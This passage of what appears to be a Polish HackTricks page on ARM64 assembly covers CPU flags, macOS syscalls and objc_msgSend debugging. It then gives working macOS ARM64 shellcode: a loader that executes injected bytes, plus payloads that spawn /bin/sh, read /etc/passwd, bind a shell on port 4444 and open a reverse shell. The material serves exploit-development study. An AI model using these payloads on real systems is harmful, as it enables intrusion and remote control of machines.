Na przykład instrukcja **`UADD8`** **dodaje cztery pary bajtów** (z dwóch operandów 32-bitowych) równolegle i przechowuje wyniki w rejestrze 32-bitowym. Następnie **ustawia flagi `GE` w `APSR`** na podstawie tych wyników. Każda flaga GE odpowiada jednemu z dodawań bajtów, wskazując, czy dodawanie dla tej pary bajtów **przekroczyło zakres**.

Instrukcja **`SEL`** używa tych flag GE do wykonywania działań warunkowych.

#### Rejestry Stanu Wykonania

- Bity **`J`** i **`T`**: **`J`** powinno być 0, a jeśli **`T`** wynosi 0, używany jest zestaw instrukcji A32, a jeśli wynosi 1, używany jest zestaw instrukcji T32.
- Rejestr Stanu Bloku IT (`ITSTATE`): Są to bity od 10-15 i 25-26. Przechowują warunki dla instrukcji wewnątrz grupy z prefiksem **`IT`**.
- Bit **`E`**: Wskazuje **kolejność bajtów**.
- Bity **Trybu i Maska Wyjątku** (0-4): Określają bieżący stan wykonania. Piąty wskazuje, czy program działa jako 32-bitowy (1) czy 64-bitowy (0). Pozostałe 4 reprezentują **tryb wyjątku obecnie używany** (gdy występuje wyjątek i jest obsługiwany). Ustawiona liczba **określa bieżący priorytet** w przypadku wywołania innego wyjątku podczas obsługi tego.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Pewne wyjątki mogą być wyłączone za pomocą bitów **`A`**, `I`, `F`. Jeśli **`A`** wynosi 1, oznacza to, że zostaną wywołane **przerwania asynchroniczne**. **`I`** konfiguruje odpowiedź na zewnętrzne **żądania przerwań sprzętowych** (IRQ), a F dotyczy **szybkich żądań przerwania** (FIR).

## macOS

### BSD syscalls

Sprawdź [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Wywołania systemowe BSD będą miały **x16 > 0**.

### Pułapki Mach

Sprawdź [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Pułapki Mach będą miały **x16 < 0**, więc musisz wywołać numery z poprzedniej listy z użyciem znaku minus: **`_kernelrpc_mach_vm_allocate_trap`** to **`-10`**.

Możesz również sprawdzić **`libsystem_kernel.dylib`** w deasemblerze, aby dowiedzieć się, jak wywołać te (i BSD) wywołania systemowe:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Czasami łatwiej jest sprawdzić **zdekompilowany** kod z **`libsystem_kernel.dylib`** **niż** sprawdzanie **kodu źródłowego**, ponieważ kod kilku wywołań systemowych (BSD i Mach) jest generowany za pomocą skryptów (sprawdź komentarze w kodzie źródłowym), podczas gdy w pliku dylib można znaleźć, co jest wywoływane.
{% endhint %}

### objc\_msgSend

To bardzo często spotykana funkcja używana w programach Objective-C lub Swift. Ta funkcja pozwala na wywołanie metody obiektu Objective-C.

Parametry ([więcej informacji w dokumentacji](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Wskaźnik do instancji
* x1: op -> Selektor metody
* x2... -> Pozostałe argumenty wywołanej metody

Więc jeśli ustawisz punkt przerwania przed skokiem do tej funkcji, łatwo można znaleźć, co jest wywoływane w lldb z (w tym przykładzie obiekt wywołuje obiekt z `NSConcreteTask`, który uruchomi polecenie):
```
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
### Kod powłoki

Aby skompilować:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Aby wyodrębnić bajty:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Kod C do przetestowania shellcode'u</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Powłoka

Pobrane z [**tutaj**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i wyjaśnione.

{% tabs %}
{% tab title="z adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="z użyciem stosu" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### Odczyt za pomocą polecenia cat

Celem jest wykonanie `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, dlatego drugi argument (x1) to tablica parametrów (która w pamięci oznacza stos adresów).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Wywołaj polecenie za pomocą sh z odgałęzienia, aby główny proces nie został zabity
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Powiązane powłoki

Powiązane powłoki z [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porcie 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Odwrócony shell

Z [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell do **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF** sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
